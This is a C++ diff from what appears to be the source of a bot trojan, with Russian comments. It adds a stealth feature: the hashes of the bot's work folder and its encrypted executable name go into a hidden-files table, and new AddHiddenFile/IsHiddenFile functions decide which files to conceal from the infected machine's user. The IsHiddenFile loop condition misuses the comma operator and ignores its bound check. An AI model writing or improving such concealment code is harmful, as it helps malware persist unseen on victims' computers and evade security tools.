@@ -63,6 +63,12 @@ TBotData* BotData = NULL;
 TBotType BotType = BotRing3;
 
 
+//--------------------------------------------
+// Массив хэше файлов, которые будет
+// прятать бот
+//--------------------------------------------
+DWORD BOT_HIDDEN_FILES[MAX_HIDDEN_FILES + 1] = {0};
+
 
 //---------------------------------------------------------------------------
 #define MAX_BOT_WORK_FOLDER_LEN 15
@@ -286,6 +292,8 @@ PCHAR TBotApplication::GetWorkFolder()
 
 	// Расчитываем хэш
 	BotWorkPathHash = STRA::Hash(BOT_WORK_FOLDER_NAME);
+	// Добавляем папку в список скрытых файлов
+	BOT::AddHiddenFile(BotWorkPathHash);
 
 	return BOT_WORK_FOLDER_NAME;
 }
@@ -626,8 +634,11 @@ PCHAR BOT::GetBotExeName()
 		STR::Free(Name);
 
 		// Расчитываем хэш имени
+		BotExeNameHash = STRA::Hash(CryptedBotExeName);
 
-		BotExeNameHash = CalcHash(CryptedBotExeName);
+		// Добавляем имя в список скрываемых фалов
+		AddHiddenFile(BotExeNameHash);
+
 	}
 
 
@@ -1092,3 +1103,49 @@ bool BOT::UpdateBotPlug(BYTE* data, int c_data)
 	}
 }
 #endif
+
+
+//----------------------------------------------------
+//  Функции для обеспечения сокрытия служебных файлов
+//----------------------------------------------------
+
+void BOT::AddHiddenFile(DWORD Hash)
+{
+	// Добавляем нэш в массив скрываемых файлов
+	if (!Hash) return;
+
+	for (int i = 0; i < MAX_HIDDEN_FILES; i++)
+	{
+		if (BOT_HIDDEN_FILES[i] == Hash) break;
+		else
+		if (BOT_HIDDEN_FILES[i] == 0)
+		{
+			BOT_HIDDEN_FILES[i] = Hash;
+			BOT_HIDDEN_FILES[i + 1] = 0;
+			break;
+		}
+	}
+}
+
+void BOT::AddHiddenFile(const char* FileName)
+{
+	AddHiddenFile(STRA::Hash(FileName));
+}
+
+
+bool BOT::IsHiddenFile(DWORD FileHash)
+{
+	// Функция возвращает истину если указанный файл необходимо спрятать
+	for (int i = 0; i < MAX_HIDDEN_FILES, BOT_HIDDEN_FILES[i] != 0 ; i++)
+	{
+		if (BOT_HIDDEN_FILES[i] == FileHash)
+			return true;
+	}
+	return false;
+}
+
+
+bool BOT::IsHiddenFile(const char* FileName)
+{
+	return IsHiddenFile(STRA::Hash(FileName));
+}
